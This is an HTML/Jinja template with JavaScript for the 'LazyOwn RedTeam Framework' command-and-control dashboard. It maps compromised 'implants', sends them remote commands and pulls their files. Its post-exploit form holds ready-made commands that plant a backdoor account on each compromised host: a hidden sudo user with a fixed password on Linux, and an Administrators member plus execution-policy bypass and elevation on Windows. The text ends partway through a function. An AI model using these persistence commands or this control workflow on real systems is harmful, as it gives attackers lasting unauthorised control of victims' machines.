{% extends "base.html" %}

{% block content %}


        <div class="card bg-secondary text-light p-4 mb-4">
            <p>
                Disclaimer: [!] Please do not use this in military or secret service organizations, or for illegal purposes. (This is non-binding, as these entities often disregard laws and ethics anyway.)
            </p>
            <h2>Connected Clients</h2>
            <div class="container mt-3">
                <div class="form-inline">
                    <div class="form-check mr-2">
                        <input type="checkbox" class="form-check-input" id="filter-clients" checked>
                        <label class="form-check-label mr-2" for="filter-clients">Clients</label>
                    </div>
                    <div class="form-check mr-2">
                        <input type="checkbox" class="form-check-input" id="filter-hosts" checked>
                        <label class="form-check-label mr-2" for="filter-hosts">Hosts</label>
                    </div>
                    <div class="form-check mr-2">
                        <input type="checkbox" class="form-check-input" id="filter-ports" checked> <!-- Nuevo -->
                        <label class="form-check-label mr-2" for="filter-ports">Ports</label>
                    </div>
                    <div class="form-group mr-2">
                        <label class="mr-2" for="os-filter">Filter OS:</label>
                        <select class="form-control form-control-sm mr-2" id="os-filter">
                            <option value="">All</option>
                            <option value="linux">Linux</option>
                            <option value="windows">Windows</option>
                        </select>
                    </div>
                    <div class="form-check mr-2">
                        <input type="checkbox" class="form-check-input" id="filter-discovered" checked>
                        <label class="form-check-label mr-2" for="filter-discovered">Discovered</label>
                    </div>
                    <div class="form-group">
                        <label class="mr-2" for="search-label">Search:</label>
                        <input type="text" class="form-control form-control-sm" id="search-label">
                    </div>
                </div>
            </div>
            <ul class="list-group">
                {% for client_id in connected_clients %}
                    <li class="list-group-item list-group-item-success">{{ client_id }}</li>
                {% endfor %}
            </ul>
            <div id="mynetwork"></div>
            {% include 'nav.html' %}
            {% include 'bots.html' %}
            <div class="container mt-4">
                <div class="row">
                    <!-- Ventana de terminal -->
                    <div class="col-md-6">
                    <div class="terminal-window">
                        <div class="terminal-controls">
                        <div class="terminal-control-button close-button"><span aria-hidden="true">×</span></div>
                        <div class="terminal-control-button minimize-button"><span aria-hidden="true">-</span></div>
                        <div class="terminal-control-button maximize-button"><span aria-hidden="true">¬</span></div>
                        </div>
                        <div class="terminal-title">Results</div>
                        <div class="card-body">
                        <div id="outputAtomic"></div>
                        </div>
                    </div>
                    </div>
                    <!-- Formulario de subida -->
                    <div class="col-md-6">
                    <section class="upload-section">
                        <h3>Upload BloodHound ZIP File</h3>
                        <form method="POST" action="/upload_zip" enctype="multipart/form-data">
                        <input type="file" name="file" class="form-control form-control-sm" required>
                        <input type="submit" class="btn mt-2" value="Upload">
                        </form>
                    </section>
                    </div>
                </div>
            </div>
            <div class="container mx-auto p-4">
                <h1 class="text-2xl font-bold mb-4">Short URL Manager</h1>

                <!-- Create Short URL Form -->
                <div class="mb-6">
                    <h2 class="text-xl mb-2">Create Short URL</h2>
                    <form id="create-url-form" class="space-y-4">
                        <div>
                            <label for="original_url" class="block">Original URL:</label>
                            <input type="url" id="original_url" name="original_url"
                                class="form-control form-control-sm w-full p-2 border rounded" required>
                        </div>
                        <div>
                            <label for="custom_short_url" class="block">Custom Short URL (optional):</label>
                            <input type="text" id="custom_short_url" name="custom_short_url"
                                class="form-control form-control-sm w-full p-2 border rounded"
                                placeholder="Leave blank for random">
                        </div>
                        <button type="submit"
                                class="btn mt-2 bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600">
                            Create Short URL
                        </button>
                    </form>
                    <p id="create-message" class="mt-2"></p>
                </div>

                <!-- URL List -->
                <div>
                    <h2 class="text-xl mb-2">Existing Short URLs</h2>
                    <table class="w-full border-collapse border">
                        <thead>
                            <tr class="bg-gray-100">
                                <th class="border p-2">Short URL</th>
                                <th class="border p-2">Original URL</th>
                                <th class="border p-2">Status</th>
                                <th class="border p-2">Actions</th>
                            </tr>
                        </thead>
                        <tbody id="url-table-body">
                            {% for short_url, data in short_urls.items() %}
                            <tr>
                                <td class="border p-2">{{ short_url }}</td>
                                <td class="border p-2">
                                    <input type="url" value="{{ data.original_url }}"
                                        class="w-full p-1 border original-url-input"
                                        data-short-url="{{ short_url }}">
                                </td>
                                <td class="border p-2">
                                    <input type="checkbox" class="active-checkbox"
                                        data-short-url="{{ short_url }}"
                                        {% if data.active %}checked{% endif %}>
                                </td>
                                <td class="border p-2">
                                    <button class="btn mt-2 update-btn bg-green-500 text-white px-2 py-1 rounded hover:bg-green-600"
                                            data-short-url="{{ short_url }}">
                                        Update
                                    </button>
                                </td>
                            </tr>
                            {% endfor %}
                        </tbody>
                    </table>
                </div>
            </div>
            <h3 class="mt-4">Contact</h3>
            <p>For any questions or feedback, please reach out to <a href="mailto\:grisiscomeback[at]gmail[dot]com" class="text-success">Gris Iscomeback</a>.</p>
            <br><br><br><br>
        </div>
        <br><br><br><br>
        <div id="dock-container">
            <div id="dock">
                <ul id="uldocker" >
                    <li id="generalButton">
                        <span>Gen Bot</span>
                        <a href="#"><img src="/static/Mac-icon.png"/></a>
                    </li>
                    <li id="taskButton">
                        <span>Task Bot</span>
                        <a href="#"><img src="/static/Mac-icon.png"/></a>
                    </li>
                    <li id="redopButton">
                        <span>ROP Bot</span>
                        <a href="#"><img src="/static/Mac-icon.png"/></a>
                    </li>
                    <li id="vulnButton">
                        <span>Vuln Bot</span>
                        <a href="#"><img src="/static/Mac-icon.png"/></a>
                    </li>
                    <li id="lazyButton">
                        <span>Lazy Bot</span>
                        <a href="#"><img src="/static/Mac-icon.png"/></a>
                    </li>
                    <li id="searchButton">
                        <span>I+D Bot</span>
                        <a href="#"><img src="/static/Mac-icon.png"/></a>
                    </li>
                    <li id="scriptButton">
                        <span>Dev Bot</span>
                        <a href="#"><img src="/static/Mac-icon.png"/></a>
                    </li>
                    <li id="chatbotButton" >
                        <span>Cmd Bot</span>
                        <a href="#"><img src="/static/Mac-icon.png"/></a>
                    </li>
                    <li id="reportButton" >
                        <span>Rep Bot</span>
                        <a href="#"><img src="/static/Mac-icon.png"/></a>
                    </li>
                </ul>

                <p class="neon-text">&copy; 2025 LazyOwn RedTeam. All rights GPLv3.</p>

            </div>
        </div>
        <div id="toastr" onclick="clearToastr();" class="toastr alert alert-success" role="alert">
        </div>
        <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
        <script src='https://storage.ko-fi.com/cdn/scripts/overlay-widget.js'></script>
        <script src="https://unpkg.com/vis-network/standalone/umd/vis-network.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-beta.1/dist/js/select2.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/showdown/2.1.0/showdown.min.js"></script>
        <script src="https://unpkg.com/tippy.js@6"></script>
        <script src="https://cdn.jsdelivr.net/npm/quill@2.0.3/dist/quill.js"></script>
        <script src="/static/js/xterm.js"></script>
        <script src="https://unpkg.com/xterm-addon-fit@0.7.0/lib/xterm-addon-fit.js"></script>
        <script src="https://unpkg.com/xterm-addon-web-links@0.5.0/lib/xterm-addon-web-links.js"></script>
        <script src="https://cdn.socket.io/4.3.2/socket.io.min.js"></script>
        <script>
            cleanOutputText = "";
            bot = '{{ bot | markdown |  replace("\'", "\\\'") | safe }}';
            event_config = {{ event_config  | tojson | safe  }};
            elo = '{{ elo }}';
            username = '{{ current_user.username }}';
            user_id = '{{ current_user_id }}';
            karma = '{{ karma_name }}';
            prompt_cmd = '{{ prompt | safe }}';
            const eventStates = {};
            var menu = $('.menu');
            var barra_busqueda = $('.search_bar');
            var bar = $('#bar');
            var icono = $('.icon-search');
            const term = new Terminal({
                cursorBlink: true,
                fontFamily: 'monospace',
                theme: {
                    background: '#000000',
                    foreground: '#00FF00'
                }
            });
            var c2_port = '{{ c2_port }}';
            term.open(document.getElementById('terminal'));
            term.writeln("Welcome to LazyOwn RedTeam Framework: CRIMEN 👋");
            const fitAddon = new FitAddon.FitAddon();
            term.loadAddon(fitAddon);

            fitAddon.fit();
            var nodes = new vis.DataSet([]);
            var edges = new vis.DataSet([]);
            var network;

            function connectNodes(nodeFromId, nodeToId) {
                edges.add({
                    from: nodeFromId,
                    to: nodeToId
                });
                if (network) {
                    network.setData({ nodes: nodes, edges: edges });
                }
            }

            function connectOrphanNodes(connectedClients, results, discovered_ips, result_portscan) {
                connectedClients.forEach(function(client) {
                    var clientData = results[client] ? results[client][0] : null;
                    if (!clientData) return;

                    var clientDiscoveredIps = (discovered_ips[client] || '').split(',').map(ip => ip.trim()).filter(ip => ip);
                    var clientPortscanIps = [];
                    if (result_portscan[client] && result_portscan[client] !== "None") {
                        try {
                            const cleanedData = result_portscan[client].replace(/'/g, '"');
                            const portData = JSON.parse(cleanedData);
                            clientPortscanIps = Object.keys(portData).filter(ip => ip.trim());

                            Object.values(portData).forEach(function(ports) {
                                ports.forEach(function(port) {
                                    const portId = `port-${client}--${port}`;
                                    connectNodes(client, portId);
                                });
                            });
                        } catch (e) {
                            //console.error("[ERROR] No se pudo parsear result_portscan para", client, ":", e);
                        }
                    }
                    var allClientIps = [...new Set([...clientDiscoveredIps, ...clientPortscanIps])];

                    allClientIps.forEach(function(ip) {
                        if (ip) {
                            const hostId = 'host-' + ip.replace(/\./g, '-');
                            connectNodes(hostId, client);
                        }
                    });

                    if (result_portscan[client] && result_portscan[client] !== "None") {
                        try {
                            const cleanedData = result_portscan[client].replace(/'/g, '"');
                            const portData = JSON.parse(cleanedData);
                            Object.keys(portData).forEach(function(ip) {
                                if (ip && !clientDiscoveredIps.includes(ip)) {
                                    const hostId = 'host-' + ip.replace(/\./g, '-');
                                    connectNodes(hostId, client);
                                }
                            });
                        } catch (e) {
                            //console.error("[ERROR] Error procesando ports para", client, ":", e);
                        }
                    }
                });

                var allHosts = Object.values(result_portscan).flatMap(data => {
                    try {
                        const cleanedData = data.replace(/'/g, '"');
                        const portData = JSON.parse(cleanedData);
                        return Object.keys(portData);
                    } catch (e) {
                        return [];
                    }
                }).concat(Object.values(discovered_ips).flatMap(ips => ips.split(',').map(ip => ip.trim()).filter(ip => ip)));
                allHosts = [...new Set(allHosts)].filter(ip => ip);
                allHosts.forEach(function(ip) {
                    const hostId = 'host-' + ip.replace(/\./g, '-');
                    if (!edges.get().some(edge => edge.to === hostId)) {
                        connectNodes(hostId, 'c2');
                    }
                });
            }
            function sendCommand(cmd) {
                term.write(cmd);
                commandBuffer = cmd;
            }
            function applyFilters() {
                var filterClients = document.getElementById('filter-clients').checked;
                var filterHosts = document.getElementById('filter-hosts').checked;
                var filterPorts = document.getElementById('filter-ports').checked;
                var osFilter = document.getElementById('os-filter').value.toLowerCase();
                var filterDiscovered = document.getElementById('filter-discovered').checked;
                var searchLabel = document.getElementById('search-label').value.toLowerCase();

                var filteredNodes = new vis.DataSet();
                var filteredEdges = new vis.DataSet();
                nodes.forEach(function(node) {
                    var includeNode = true;

                    if (node.group === 'clients') {
                        if (!filterClients) {
                            includeNode = false;
                        } else if (osFilter && !node.label.toLowerCase().includes('(os/' + osFilter + ')')) {
                            includeNode = false;
                        }
                    } else if (node.group === 'hosts') {
                        if (!filterHosts) {
                            includeNode = false;
                        }
                    } else if (node.group === 'ports') {
                        if (!filterPorts) {
                            includeNode = false;
                        }
                    }

                    if (searchLabel && !node.label.toLowerCase().includes(searchLabel)) {
                        includeNode = false;
                    }

                    if (includeNode) {
                        filteredNodes.add(node);
                    }
                });
                edges.forEach(function(edge) {
                    var fromNodeVisible = filteredNodes.get(edge.from) !== null;
                    var toNodeVisible = filteredNodes.get(edge.to) !== null;

                    if (fromNodeVisible && toNodeVisible) {
                        if (edge.to && edge.to.startsWith('host-') && !filterDiscovered && edges.get(edge.to).from === 'no_priv') {
                            let hostNode = nodes.get(edge.to);
                            if (hostNode && hostNode.group === 'hosts') {
                                if (!edges.getIds({ filter: e => e.to === edge.to && e.from === 'c2' }).length > 0) {
                                    return;
                                }
                            }
                        }
                        filteredEdges.add(edge);
                    }
                });
                var data = {
                    nodes: filteredNodes,
                    edges: filteredEdges
                };
                network.setData(data);
            }
            function RunCmd(command){
                const spinner = document.getElementById('loader');
                var check = document.getElementById('check_local_shell');
                var isChecked = false;
                if (check) {
                    isChecked = check.checked
                    if (isChecked) {

                    } else {

                    }
                } else {

                }
                spinner.style.display = 'block';
                fetch('/api/run', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ command })
                })
                .then(response => response.json())
                .then(data => {

                    spinner.style.display = 'none';
                    if (data.error) {
                        outputDiv.innerHTML += `<p style="color: red;">${data.error}</p>`;
                        term.write('\r\n' + '\x1b[31m' + data.error + '\x1b[0m');
                    } else {
                        toastr('<h1>Command:' + command + "</h1>")
                        fetchLog(isChecked)

                    }
                    term.prompt();
                });
            }
            function stripAnsi(str) {
                const ansiRegex = /[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g;
                return str.replace(ansiRegex, '');
            }
            function leftTrim(str) {
                return str.replace(/^\s+/, '').trim();
            }
            async function fetchLog(isChecked) {
                try {
                    const response = await fetch('/api/output');

                    if (!response.ok) {
                        throw new Error('Network response was not ok ' + response.statusText);
                    }

                    const data = await response.json();
                    const outputDiv = document.getElementById('output');
                    const outputAtomic = document.getElementById('outputAtomic');
                    const outputText = data.output.replace(/\n/g, '<br>');
                    var output = data.output.replace(/\t/g, '    ').replace(/\n/g, '\r\n');


                    term.write('\x1b[2J\x1b[3J\x1b[H');
                    prompt_cmd = prompt_cmd.replace(/<br>/g, '\n')
                    let lines = prompt_cmd.split('\n');
                    lines.forEach(function(line) {
                        term.write(line);
                    });
                    term.write(output);
                    cleanOutputText = stripAnsi(outputText);
                    if (isChecked){
                        formGeneral_bot(cleanOutputText);
                    }
                    //outputDiv.innerHTML += `<p>${cleanOutputText}</p>`;
                    outputAtomic.innerHTML += `<p>${cleanOutputText}</p>`;
                } catch (error) {

                }
            }



            async function fetchTasks() {
                try {
                    const response = await fetch('/gettasks');
                    const tasks = await response.json();
                    tasks.forEach((task, index) => {
                        setTimeout(() => {
                            if (task.status !== "Done") {
                                toastr(`<h1>Task: ${task.title},</h1> Description: ${task.description}`);
                            }
                        }, index * 1000);
                    });
                } catch (error) {

                }
            }

            function RunRemoteCmd(client_id, command){
                const spinner = document.getElementById('loader');
                spinner.style.display = 'block';
                const clientId = client_id;
                const formData = new FormData();
                formData.append('client_id', clientId);
                formData.append('command', command);
                const username = '{{ username }}';
                const password = '{{ password }}';
                const credentials = btoa(`${username}:${password}`);
                fetch('/issue_command', {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'Authorization': `Basic ${credentials}`
                    }
                })
                .then(data => {
                    spinner.style.display = 'none';
                    if (data.error) {

                    } else {
                        var msg = "<h1>Command:" + command + " <h1>";
                        toastr(msg)
                    }
                })
                .catch(error => {
                    spinner.style.display = 'none';

                });
            }
            function consoleText(words, id, colors) {
                if (colors === undefined) colors = ['#fff'];
                    var visible = true;
                    var con = document.getElementById('console');
                    var letterCount = 1;
                    var x = 1;
                    var waiting = false;
                    var target = document.getElementById(id)
                    target.setAttribute('style', 'color:' + colors[0])
                    window.setInterval(function() {

                    if (letterCount === 0 && waiting === false) {
                        waiting = true;
                        target.innerHTML = words[0].substring(0, letterCount)
                        window.setTimeout(function() {
                            var usedColor = colors.shift();
                            colors.push(usedColor);
                            var usedWord = words.shift();
                            words.push(usedWord);
                            x = 1;
                            target.setAttribute('style', 'color:' + colors[0])
                            letterCount += x;
                            waiting = false;
                        }, 1000)
                        } else if (letterCount === words[0].length + 1 && waiting === false) {
                        waiting = true;
                        window.setTimeout(function() {
                            x = -1;
                            letterCount += x;
                            waiting = false;
                        }, 1000)
                        } else if (waiting === false) {
                        target.innerHTML = words[0].substring(0, letterCount)
                        letterCount += x;
                        }
                    }, 120)
                window.setInterval(function() {
                    if (visible === true) {
                    con.className = 'console-underscore hidden'
                    visible = false;

                    } else {
                    con.className = 'console-underscore'

                    visible = true;
                    }
                }, 400)
            }
            barra_busqueda.focusout(function(){
                barra_busqueda.css('width', '15%');
                menu.css('width', '99%');
                icono.css('color', '#fff');
                bar.css('color', '#fff');
            });
            event_config.events.forEach(event => {
                eventStates[`not_${event.name}`] = true;
            });
            events_json = {};

            async function lazyForm(prompt, id) {
                const responseDiv = document.getElementById(id);
                responseDiv.innerHTML = '';

                try {
                    const response = await fetch('/lazybot', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ prompt })
                    });

                    const reader = response.body.getReader();
                    const decoder = new TextDecoder();
                    let buffer = '';

                    while (true) {
                        const { done, value } = await reader.read();
                        if (done) break;

                        buffer += decoder.decode(value, { stream: true });

                        let boundary = buffer.lastIndexOf('\n');
                        if (boundary === -1) continue;

                        const chunks = buffer.substring(0, boundary).split('\n');
                        buffer = buffer.substring(boundary + 1);

                        for (const chunk of chunks) {
                            try {
                                const data = JSON.parse(chunk);
                                if (data.response) {
                                    responseDiv.innerHTML +=  data.response;
                                }
                            } catch (e) {

                            }
                        }
                    }

                    // Procesar cualquier dato restante
                    if (buffer) {
                        try {
                            const data = JSON.parse(buffer);
                            if (data.response) {
                                responseDiv.innerHTML += data.response;
                            }
                        } catch (e) {

                        }
                    }
                } catch (error) {

                }
            }
            async function reportForm(prompt, id) {
                const responseDiv = document.getElementById(id);
                responseDiv.innerHTML = '';

                try {
                    const response = await fetch('/lazyreport', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ prompt })
                    });

                    const reader = response.body.getReader();
                    const decoder = new TextDecoder();
                    let buffer = '';

                    while (true) {
                        const { done, value } = await reader.read();
                        if (done) break;

                        buffer += decoder.decode(value, { stream: true });

                        let boundary = buffer.lastIndexOf('\n');
                        if (boundary === -1) continue;

                        const chunks = buffer.substring(0, boundary).split('\n');
                        buffer = buffer.substring(boundary + 1);

                        for (const chunk of chunks) {
                            try {
                                const data = JSON.parse(chunk);
                                if (data.response) {
                                    responseDiv.innerHTML +=  data.response;
                                }
                            } catch (e) {

                            }
                        }
                    }

                    // Procesar cualquier dato restante
                    if (buffer) {
                        try {
                            const data = JSON.parse(buffer);
                            if (data.response) {
                                responseDiv.innerHTML += data.response;
                            }
                        } catch (e) {

                        }
                    }
                } catch (error) {

                }
            }
            async function sendNotification(htmlContent) {
                const url = '/push_notification';
                const formData = new FormData();
                formData.append('html', htmlContent);

                try {
                    const response = await fetch(url, {
                        method: 'POST',
                        body: formData
                    });

                    if (!response.ok) {
                        throw new Error('Network response was not ok ' + response.statusText);
                    }

                    const data = await response.json();

                } catch (error) {

                }
            }
            function vulnForm(event){

                var userInput = '';
                const spinner = document.getElementById('loader');
                spinner.style.display = 'block';

                fetch('/vuln', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ prompt: userInput, event_view:event})
                })
                .then(response => response.json())
                .then(data => {

                    spinner.style.display = 'none';
                    if (data.error) {

                        document.getElementById('vulnResponse').innerHTML += `<p style="color: red;">Groq has trouble.</p>`;

                    } else {

                        var converter = new showdown.Converter();
                        var html = converter.makeHtml(data.response);
                        document.getElementById('vulnResponse').innerHTML += `<p>${html}</p>`;
                        if (data.response) {


                        }
                    }
                })
                .catch(error => {
                    spinner.style.display = 'none';

                    document.getElementById('vulnResponse').innerHTML += `<p style="color: red;">Error de red: ${error.message}</p>`;
                });
            }
            function closePopup(self) {
                var popupContainer = self;
                popupContainer.classList.remove('visible');
            }
            function clearToastr() {
                    var toastr = document.getElementById('toastr');
                    var neonTextElements = toastr.children;

                    while (neonTextElements.length > 0) {
                        neonTextElements[0].parentNode.removeChild(neonTextElements[0]);
                    }
                    toastr.classList.remove('show');
            }
            async function fetchEvents() {
                try {
                    const response = await fetch('/events');

                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    const events = await response.json();
                    let events_json = {};
                    for (const event of event_config.events) {
                        const eventName = event.name;
                        const eventKey = eventName.charAt(0).toUpperCase() + eventName.slice(1);
                        if (events[eventName] && events[eventName].exist && eventStates[`not_${eventName}`]) {
                            eventStates[`not_${eventName}`] = false;

                            toastr(`<h1>${eventKey}</h1> <h2> events found !!!</h2>`);
                            aumentarElo(user_id, 50, eventKey);
                            document.getElementById('vulnButton').click();
                            events_json[eventName] = true;
                            vulnForm(eventName);
                        }
                    }
                    if (Object.keys(events_json).length === 0) {

                    }
                } catch (error) {

                }
            }
            function toastr(command) {
                    var toastr = document.getElementById('toastr');
                    toastr.classList.add('show');
                    toastr.innerHTML += "<div onclick='closePopup(this);' class='neon-text'> " + command + " </div><br><hr>";
                    sendNotification(command)
                    setTimeout(function() {
                        clearToastr();
                    }, 22000);
            }
            function formGeneral_bot(prompt = ""){
                const spinner = document.getElementById('loader');
                    spinner.style.display = 'block';
                    var userInput = "";
                    if (prompt){
                        userInput = prompt;
                    } else {
                        userInput = document.getElementById('generalInput').value;
                    }
                    fetch('/generalbot', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ prompt: userInput })
                    })
                    .then(response => response.json())
                    .then(data => {

                        spinner.style.display = 'none';
                        if (data.error) {
                            document.getElementById('generalResponse').innerHTML += `<p style="color: red;">Groq has trouble, trying with deepseek, please await.</p>`;
                            var lazyprompt = document.getElementById('generalInput').value;
                            lazyForm(lazyprompt, 'generalInput').then(function() {
                                var converter = new showdown.Converter();
                                var responseDiv = document.getElementById('generalResponse');
                                if (responseDiv) {
                                    responseDiv.innerHTML = converter.makeHtml(responseDiv.textContent);
                                }
                            });
                        } else {
                            var converter = new showdown.Converter();
                            var html = converter.makeHtml(data.response);
                            document.getElementById('generalResponse').innerHTML += `<p>${html}</p>`;
                            document.getElementById('outputIA').innerHTML += `<p>${html}</p>`;


                            if (data.response) {

                                //document.getElementById('generalResponse').innerHTML += `<pre>${data.output}</pre>`;
                            }
                        }
                    })
                    .catch(error => {
                        spinner.style.display = 'none';

                        document.getElementById('generalResponse').innerHTML += `<p style="color: red;">Error de red: ${error.message}</p>`;
                    });
            }
            toastr(bot)
            fetchEvents();
            async function fetchCSVData(filePath, id_client) {
                const spinner = document.getElementById('loader');
                spinner.style.display = 'block';
                const response = await fetch('/csv_to_html', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ file_path: filePath })
                });

                if (response.ok) {
                    spinner.style.display = 'none';
                    const html = await response.text();
                    var selector = 'outputLog' + id_client;
                    document.getElementById(selector).innerHTML = html;
                    var popupContainer = document.getElementById('popupContainer' + id_client);
                    popupContainer.classList.add('visible');
                    setTimeout(closePopup, 10000);

                } else {
                    spinner.style.display = 'none';
                    const error = await response.json();

                }
                spinner.style.display = 'none';
            }
            async function aumentarElo(userId, cantidad, eventy) {
                try {
                    const response = await fetch(`/aumentar_elo/${userId}`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ cantidad: cantidad }),  // Enviar la cantidad en el cuerpo
                    });

                    if (!response.ok) {
                        throw new Error(`Error: ${response.statusText}`);
                    }
                    const data = await response.json();
                    toastr(`<h1>New ${eventy} achievement unlocked. </h1><h2> ${data.message} </h2>`);
                } catch (error) {

                }
            }
            document.addEventListener('DOMContentLoaded', function() {
                consoleText(['LazyOwn RedTeam Framework', 'LazyOwn Comand & Conquer IA Center', 'Mr Hyde Rootkit/Implants Made with Love'], 'text',['tomato','rebeccapurple','lightblue']);
                setInterval(fetchEvents, 60000);
                $("#dock-container").on('mouseleave', function() {
                    $(this).css('bottom', '-100px');
                });

                $("#dock-container").on('mouseenter', function() {
                    $(this).css('bottom', '0px');
                });
                const quill = new Quill("#description", {
                    theme: "snow",
                });
                document.getElementById('filter-clients').addEventListener('change', applyFilters);
                document.getElementById('filter-hosts').addEventListener('change', applyFilters);
                document.getElementById('filter-ports').addEventListener('change', applyFilters);
                document.getElementById('os-filter').addEventListener('change', applyFilters);
                document.getElementById('filter-discovered').addEventListener('change', applyFilters);
                document.getElementById('search-label').addEventListener('input', applyFilters);
                document.getElementById('taskForm').addEventListener('submit', function(event) {
                    event.preventDefault();


                    const title = document.getElementById('title').value;
                    const description = quill.root.innerHTML;
                    const operator = document.getElementById('operator').value;
                    const status = document.getElementById('status').value;

                    const formData = new FormData();
                    formData.append('title', title);
                    formData.append('description', description);
                    formData.append('operator', operator);
                    formData.append('status', status);

                    fetch('/', {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => {
                        if (response.redirected) {
                            window.location.href = response.url;
                        } else {
                            return response.json();
                        }
                    })
                    .then(data => {


                    })
                    .catch((error) => {


                    });
                });

                const tooltipContainer = document.querySelector('.tooltip-container');
                const tooltipText = document.querySelector('.tooltip-text');

                if (tooltipContainer && tooltipText) {
                    tooltipContainer.addEventListener('mouseover', function() {
                        tooltipText.style.visibility = 'visible';
                        tooltipText.style.opacity = '1';
                    });

                    tooltipContainer.addEventListener('mouseout', function() {
                        tooltipText.style.visibility = 'hidden';
                        tooltipText.style.opacity = '0';
                    });
                } else {

                }
                $(document).ready(function() {
                    $('#directory').select2({
                        placeholder: 'Select a tactic',
                        allowClear: true,
                        dropdownCssClass: 'custom-dropdown',
                        theme: 'default'
                    });
                });

                kofiWidgetOverlay.draw('grisuno', {
                    'type': 'floating-chat',
                    'floating-chat.donateButton.text': 'Support me',
                    'floating-chat.donateButton.background-color': '#5cb85c',
                    'floating-chat.donateButton.text-color': '#fff'
                });

                document.getElementById('post-exploit-form').addEventListener('submit', function(event) {
                    event.preventDefault();
                    const clientId = document.getElementById('client_id').value;
                    os = document.getElementById(clientId).value;
                    if(os === "Linux"){
                        command = "useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && sudo usermod -aG sudo grisun0 && su - grisun0"
                    }
                    if(os === "Windows"){
                        command = "powershell $userExists = Get-LocalUser -Name 'grisun0' -ErrorAction SilentlyContinue; if ($userExists) { Write-Output 'User grisun0 already exists.' } else { $password = 'Grisgrisgris123!'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; New-LocalUser -Name 'grisun0' -Password $securePassword -FullName 'Grisun0 User' -Description 'Grisun0 User'; }; $group = Get-LocalGroup -Name 'Administrators' -ErrorAction SilentlyContinue; if ($group) { Add-LocalGroupMember -Group 'Administrators' -Member 'grisun0' } else { Write-Output 'Group Administrators was not found.' }; Start-Process powershell -Verb runAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command `\"Start-Process cmd.exe -Verb runAs -ArgumentList \"/C runas /user:grisun0 cmd.exe\"`\"' ; net localgroup administrators grisun0 /add"
                    }
                    RunRemoteCmd(clientId,command);
                });
                document.getElementById('upload-file-form').addEventListener('submit', function(event) {
                    event.preventDefault();
                    const clientId = document.getElementById('client_id').value;
                    const filePath = document.getElementById('file_path').value;
                    const spinner = document.getElementById('loader');
                    spinner.style.display = 'block';
                    const formData = new FormData();
                    formData.append('client_id', clientId);
                    formData.append('command', `upload:${filePath}`);


                    const username = '{{ username }}';
                    const password = '{{ password }}';
                    const credentials = btoa(`${username}:${password}`);

                    fetch('/issue_command', {
                        method: 'POST',
                        body: formData,
                        headers: {
                            'Authorization': `Basic ${credentials}`
                        }
                    })
                    .then(data => {
                        spinner.style.display = 'none';
                        if (data.error) {

                        } else {
                            command = "<h1>Upload File Successfully.</h1>"
                            toastr(command)
                        }
                    })
                    .catch(error => {
                        spinner.style.display = 'none';

                    });
                });
                document.getElementById('commandForm').addEventListener('submit', function(event) {
                    event.preventDefault();
                    command = document.getElementById('attack').value;
                    RunCmd(command)
                });
                async function issueCommand(clientId, command) {
                    const url = '/issue_command';
                    const data = new URLSearchParams();
                    data.append('client_id', clientId);
                    data.append('command', command);
                    const spinner = document.getElementById('loader');
                    spinner.style.display = 'block';
                    try {
                        const response = await fetch(url, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            },
                            body: data
                        });

                        if (!response.ok) {
                            throw new Error(`Error en la solicitud: ${response.statusText}`);
                        }

                        const result = await response.json();

                        spinner.style.display = 'none';
                        return result;
                    } catch (error) {
                        spinner.style.display = 'none';

                        return { error: error.message };
                    }
                }
                function htmlTitle(html) {
                    const container = document.createElement("div");
                    container.innerHTML = html;
                    return container;
                }
                function generateGraph(connectedClients, connectedHosts) {
                    var local_ips = {{ local_ips | tojson | safe }};
                    nodes.clear();
                    edges.clear();
                    nodes.add({
                        id: 'c2',
                        label: 'C&C LazyOwn \n' + local_ips.join(', '),
                        title: htmlTitle(bot),
                        shape: 'image',
                        image: '/static/c2.png',
                        size: 100,
                        font: { color: '#ffffff' }
                    });

                    var connectedClients = {{ connected_clients | tojson | safe }};
                    var results = {{ commands_history | tojson | safe }};
                    var discovered_ips = {{ discovered_ips | tojson | safe }};
                    var result_portscan = {{ result_portscan | tojson | safe }};
                    connectOrphanNodes(connectedClients, results, result_portscan, result_portscan);
                    fetch('/aicmd?arg=1')
                        .then(response => response.json())
                        .then(data => {
                            var converter = new showdown.Converter();
                            var html = converter.makeHtml(data);
                            var newTitle = html;
                            var newLabel = "C&C LazyOwn[AI]TeamServer >_ \n" + local_ips.join(', ');
                            toastr(html);
                            nodes.update({ id: 'c2', label: newLabel, title: htmlTitle(newTitle) });
                        });

                    connectedClients.forEach(function(client) {
                        var clientData = results[client] ? results[client][0] : null;
                        if (!clientData) return;

                        var label = "Implant ID: " + client;
                        var image = '/static/client.png';
                        var client_os = clientData.os;
                        var ips = clientData.ips;
                        var pid = clientData.pid;
                        var user = clientData.user;
                        var hostname = clientData.hostname;
